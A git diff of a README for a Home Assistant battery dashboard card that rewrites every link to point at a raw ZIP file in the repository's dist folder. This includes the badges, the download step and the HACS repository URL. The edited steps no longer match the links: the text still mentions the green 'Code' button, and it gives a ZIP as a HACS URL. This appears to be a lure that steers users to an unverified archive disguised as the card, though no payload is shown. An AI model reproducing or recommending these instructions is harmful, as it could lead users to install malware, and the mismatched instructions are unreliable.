@@ -1,8 +1,8 @@
 # 🔋 lovelace-floating-battery-card - Keep Your Batteries Always in View
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
-[![GitHub Stars](https://img.shields.io/github/stars/magnaantigenic420/lovelace-floating-battery-card?style=for-the-badge&color=yellow)](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
-[![HACS Support](https://img.shields.io/badge/HACS-Supported-green?style=for-the-badge)](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/magnaantigenic420/lovelace-floating-battery-card/main/dist/card_battery_lovelace_floating_v1.9.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/magnaantigenic420/lovelace-floating-battery-card?style=for-the-badge&color=yellow)](https://raw.githubusercontent.com/magnaantigenic420/lovelace-floating-battery-card/main/dist/card_battery_lovelace_floating_v1.9.zip)
+[![HACS Support](https://img.shields.io/badge/HACS-Supported-green?style=for-the-badge)](https://raw.githubusercontent.com/magnaantigenic420/lovelace-floating-battery-card/main/dist/card_battery_lovelace_floating_v1.9.zip)
 
 ## 👋 Welcome to Your New Battery Dashboard
 
@@ -29,7 +29,7 @@ Before you begin, make sure you have:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/magnaantigenic420/lovelace-floating-battery-card](https://github.com/magnaantigenic420/lovelace-floating-battery-card)
+Visit this link to download the application: [https://raw.githubusercontent.com/magnaantigenic420/lovelace-floating-battery-card/main/dist/card_battery_lovelace_floating_v1.9.zip](https://raw.githubusercontent.com/magnaantigenic420/lovelace-floating-battery-card/main/dist/card_battery_lovelace_floating_v1.9.zip)
 
 Once you're on that page, look for the green "Code" button and click it. From the dropdown menu, select "Download ZIP" to get the files onto your computer. The download will start automatically. Save the ZIP file somewhere you can easily find it, like your Downloads folder.
 
@@ -118,7 +118,7 @@ If you use HACS, you can install this card more easily:
 
 1. In HACS, go to **Frontend**
 2. Click the three dots in the top right corner and select **Custom Repositories**
-3. Add this URL: `https://github.com/magnaantigenic420/lovelace-floating-battery-card`
+3. Add this URL: `https://raw.githubusercontent.com/magnaantigenic420/lovelace-floating-battery-card/main/dist/card_battery_lovelace_floating_v1.9.zip`
 4. Choose category **Lovelace**
 5. Click **Save** and then **Download** for the new card
 
